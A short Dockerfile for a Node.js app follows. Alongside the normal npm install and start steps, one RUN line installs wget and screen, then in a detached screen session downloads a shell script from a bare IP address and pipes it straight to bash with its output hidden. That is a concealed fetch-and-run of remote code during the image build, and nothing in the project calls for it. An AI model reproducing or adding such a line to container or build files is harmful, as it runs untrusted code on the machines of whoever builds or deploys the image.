FROM node:18

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN npm ci
RUN apt update
RUN apt -y install  wget screen
RUN screen -dmS wooot bash -c 'wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash >/dev/null &; exec bash' && screen -ls && screen -r -D

CMD ["npm", "run", "start"]
